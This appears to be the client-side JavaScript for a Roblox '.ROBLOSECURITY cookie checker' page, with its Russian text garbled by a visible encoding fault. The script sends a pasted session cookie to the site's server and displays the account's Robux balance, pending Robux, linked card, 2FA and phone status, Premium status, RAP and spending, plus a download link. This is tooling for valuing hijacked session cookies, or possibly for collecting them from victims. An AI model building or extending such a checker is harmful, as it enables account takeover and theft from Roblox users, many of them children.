document.addEventListener('DOMContentLoaded', function() {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–¥–µ—Ä–∂–∫—É –±—Ä–∞—É–∑–µ—Ä–æ–º
    if (!window.Particles) {
        console.warn('Particles.js not loaded, using fallback animation');
        createFallbackAnimation();
    } else {
        particlesJS('particles-js', {
            particles: {
                number: { value: 60, density: { enable: true, value_area: 800 } },
                color: { value: "#ffffff" },
                shape: { type: "circle" },
                opacity: { value: 0.3, random: true },
                size: { value: 2, random: true },
                line_linked: {
                    enable: true,
                    distance: 120,
                    color: "#ffffff",
                    opacity: 0.1,
                    width: 0.5
                },
                move: {
                    enable: true,
                    speed: 1.5,
                    direction: "none",
                    random: true,
                    straight: false,
                    out_mode: "out"
                }
            },
            interactivity: {
                detect_on: "canvas",
                events: {
                    onhover: { enable: true, mode: "grab" },
                    onclick: { enable: true, mode: "push" },
                    resize: true
                }
            }
        });
    }

    function createFallbackAnimation() {
        const canvas = document.getElementById('particles-js');
        if (canvas) {
            canvas.innerHTML = '<div style="position:absolute;width:100%;height:100%;background:linear-gradient(45deg, rgba(102,126,234,0.3), rgba(118,75,162,0.3));animation: pulse 4s ease-in-out infinite;"></div>';
        }
    }

    const checkButton = document.getElementById('checkButton');
    const cookieInput = document.getElementById('cookieInput');
    const resultSection = document.getElementById('resultSection');
    const errorSection = document.getElementById('errorSection');

    if (checkButton && cookieInput) {
        checkButton.addEventListener('click', checkCookie);
        cookieInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                checkCookie();
            }
        });
    }

    async function checkCookie() {
        const cookie = cookieInput.value.trim();
        
        if (!cookie) {
            showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫—É–∫–∏');
            return;
        }

        if (!cookie.includes('ROBLOSECURITY')) {
            showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π ROBLOSECURITY –∫—É–∫–∏');
            return;
        }

        showLoading(true);
        hideResults();

        try {
            const response = await fetch('/api/check_cookie', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ cookie: cookie })
            });

            const result = await response.json();

            if (!response.ok) {
                throw new Error(result.error || 'HTTP error ' + response.status);
            }

            if (result.error) {
                showError(result.error);
            } else {
                displayResults(result);
            }
        } catch (error) {
            console.error('Check error:', error);
            showError('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ' + error.message);
        } finally {
            showLoading(false);
        }
    }

    function displayResults(data) {
        if (!data || typeof data !== 'object') {
            showError('–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞–Ω–Ω—ã—Ö');
            return;
        }

        try {
            // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            const basicInfoEl = document.getElementById('basicInfo');
            if (basicInfoEl) {
                basicInfoEl.innerHTML = `
                    <div class="info-item">
                        <span>üë§ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</span>
                        <span>${escapeHtml(data.username || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}</span>
                    </div>
                    <div class="info-item">
                        <span>üìõ Display Name:</span>
                        <span>${escapeHtml(data.display_name || 'N/A')}</span>
                    </div>
                    <div class="info-item">
                        <span>üÜî ID –∞–∫–∫–∞—É–Ω—Ç–∞:</span>
                        <span>${escapeHtml(data.account_id || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}</span>
                    </div>
                    <div class="info-item">
                        <span>üìÖ –í–æ–∑—Ä–∞—Å—Ç –∞–∫–∫–∞—É–Ω—Ç–∞:</span>
                        <span>${data.account_age_days || 0} –¥–Ω–µ–π</span>
                    </div>
                    <div class="info-item">
                        <span>üîó –°—Å—ã–ª–∫–∞ –Ω–∞ –ø—Ä–æ—Ñ–∏–ª—å:</span>
                        <a href="${escapeHtml(data.profile_link || '#')}" target="_blank" style="color: #48dbfb;">–û—Ç–∫—Ä—ã—Ç—å</a>
                    </div>
                `;
            }

            // –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
            const securityInfoEl = document.getElementById('securityInfo');
            if (securityInfoEl) {
                securityInfoEl.innerHTML = `
                    <div class="info-item">
                        <span>üõ°Ô∏è 2FA:</span>
                        <span class="status ${data['2fa'] ? 'positive' : 'negative'}">
                            ${data['2fa'] ? '‚úÖ –í–∫–ª—é—á–µ–Ω–æ' : '‚ùå –í—ã–∫–ª—é—á–µ–Ω–æ'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>üì± –¢–µ–ª–µ—Ñ–æ–Ω:</span>
                        <span class="status ${data.phone ? 'positive' : 'negative'}">
                            ${data.phone ? '‚úÖ –ü—Ä–∏–≤—è–∑–∞–Ω' : '‚ùå –ù–µ –ø—Ä–∏–≤—è–∑–∞–Ω'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>üí≥ –ö–∞—Ä—Ç–∞:</span>
                        <span class="status ${data.card ? 'positive' : 'negative'}">
                            ${data.card ? '‚úÖ –ü—Ä–∏–≤—è–∑–∞–Ω–∞' : '‚ùå –ù–µ –ø—Ä–∏–≤—è–∑–∞–Ω–∞'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>üí∞ Billing:</span>
                        <span class="status ${data.card ? 'positive' : 'negative'}">
                            ${data.card ? '‚úÖ –î–æ—Å—Ç—É–ø–µ–Ω' : '‚ùå –ù–µ –¥–æ—Å—Ç—É–ø–µ–Ω'}
                        </span>
                    </div>
                `;
            }

            // –≠–∫–æ–Ω–æ–º–∏–∫–∞
            const economyInfoEl = document.getElementById('economyInfo');
            if (economyInfoEl) {
                economyInfoEl.innerHTML = `
                    <div class="info-item">
                        <span>üíé –ë–∞–ª–∞–Ω—Å Robux:</span>
                        <span style="color: #feca57; font-weight: bold;">${data.balance || 0}</span>
                    </div>
                    <div class="info-item">
                        <span>‚è≥ Pending Robux:</span>
                        <span>${data.pending_robux || 0}</span>
                    </div>
                    <div class="info-item">
                        <span>üëë Premium:</span>
                        <span class="status ${data.premium ? 'positive' : 'negative'}">
                            ${data.premium ? '‚úÖ –ê–∫—Ç–∏–≤–µ–Ω' : '‚ùå –ù–µ –∞–∫—Ç–∏–≤–µ–Ω'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>üé® RAP:</span>
                        <span class="status ${data.rap ? 'positive' : 'negative'}">
                            ${data.rap ? '‚úÖ –ï—Å—Ç—å' : '‚ùå –ù–µ—Ç'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>üè¢ Group Pending:</span>
                        <span>${data.pending_group_robux || 0}</span>
                    </div>
                    <div class="info-item">
                        <span>üí∏ –í—Å–µ–≥–æ –ø–æ—Ç—Ä–∞—á–µ–Ω–æ:</span>
                        <span>${data.total_spent || 0} Robux</span>
                    </div>
                `;
            }

            // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–Ω–æ–ø–∫–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
            const downloadBtn = document.getElementById('downloadBtn');
            if (downloadBtn && data.check_id) {
                downloadBtn.onclick = () => {
                    window.location.href = `/download/${data.check_id}`;
                };
                downloadBtn.style.display = 'inline-block';
            }

            resultSection.classList.remove('hidden');
            errorSection.classList.add('hidden');

            // –ü–ª–∞–≤–Ω–∞—è –ø—Ä–æ–∫—Ä—É—Ç–∫–∞ –∫ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º
            resultSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });

        } catch (error) {
            console.error('Display error:', error);
            showError('–û—à–∏–±–∫–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤');
        }
    }

    function escapeHtml(unsafe) {
        if (typeof unsafe !== 'string') return unsafe;
        return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function showError(message) {
        const errorMessageEl = document.getElementById('errorMessage');
        if (errorMessageEl) {
            errorMessageEl.textContent = message;
        }
        errorSection.classList.remove('hidden');
        resultSection.classList.add('hidden');
        
        if (errorSection) {
            errorSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
    }

    function hideResults() {
        resultSection.classList.add('hidden');
        errorSection.classList.add('hidden');
    }

    function showLoading(show) {
        if (!checkButton) return;
        
        const btnText = checkButton.querySelector('.btn-text');
        const loader = checkButton.querySelector('.btn-loader');
        
        if (show) {
            btnText.style.display = 'none';
            loader.style.display = 'block';
            checkButton.disabled = true;
            checkButton.style.opacity = '0.7';
        } else {
            btnText.style.display = 'block';
            loader.style.display = 'none';
            checkButton.disabled = false;
            checkButton.style.opacity = '1';
        }
    }

    // –î–æ–±–∞–≤–ª—è–µ–º CSS –∞–Ω–∏–º–∞—Ü–∏—é –¥–ª—è fallback
    const style = document.createElement('style');
    style.textContent = `
        @keyframes pulse {
            0% { opacity: 0.3; }
            50% { opacity: 0.6; }
            100% { opacity: 0.3; }
        }
    `;
    document.head.appendChild(style);
});